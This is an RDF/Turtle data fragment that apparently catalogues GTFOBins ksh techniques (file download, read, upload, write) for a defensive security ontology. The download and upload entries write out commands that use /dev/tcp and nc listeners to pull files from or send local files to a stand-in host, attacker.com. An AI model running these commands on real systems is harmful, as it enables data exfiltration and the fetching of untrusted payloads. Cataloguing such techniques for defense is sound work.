mknd:command_ksh-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ksh-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request.",
        "Fetch remote file using a TCP connection. Run `nc -l -p 12345 < \"file_to_send\"` on the attacker box to send the file." ;
    d3f:uses mknd:executable_ksh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ksh ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE'
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_get
ksh -c '{ echo -ne "GET /$LFILE HTTP/1.0\\r\\nhost: $RHOST\\r\\n\\r\\n" 1>&3; cat 0<&3; } \\
    3<>/dev/tcp/$RHOST/$RPORT \\
    | { while read -r; do [ "$REPLY" = "$(echo -ne "\\r")" ] && break; done; cat; } > $LFILE'
""" .

mknd:command_ksh-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ksh-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "It trims trailing newlines." ;
    d3f:uses mknd:executable_ksh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ksh ;
    mknd:provides mknd:function_file-read ;
    mknd:value """export LFILE=file_to_read
ksh -c $'read -r -d \\x04 < "$LFILE"; echo "$REPLY"'
""",
        """export LFILE=file_to_read
ksh -c 'echo "$(<$LFILE)"'
""" .

mknd:command_ksh-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ksh-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send local file in the body of an HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
        "Send local file using a TCP connection. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file." ;
    d3f:uses mknd:executable_ksh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ksh ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT'
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
ksh -c 'echo -e "POST / HTTP/0.9\\n\\n$(cat $LFILE)" > /dev/tcp/$RHOST/$RPORT'
""" .

mknd:command_ksh-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "ksh-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_ksh ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_ksh ;
    mknd:provides mknd:function_file-write ;
    mknd:value """export LFILE=file_to_write
ksh -c 'echo DATA > $LFILE'
""" .

